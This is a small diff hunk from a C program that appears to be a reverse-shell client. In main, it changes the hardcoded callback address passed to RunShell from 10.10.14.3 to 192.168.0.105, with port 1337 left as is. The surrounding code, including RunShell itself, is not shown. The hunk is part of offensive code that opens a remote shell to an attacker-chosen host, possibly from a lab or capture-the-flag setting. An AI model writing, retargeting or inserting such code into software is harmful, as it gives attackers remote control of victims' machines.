@@ -116,7 +116,7 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "10.10.14.3";
+        char host[] = "192.168.0.105";
         int port = 1337;
         RunShell(host, port);
     }
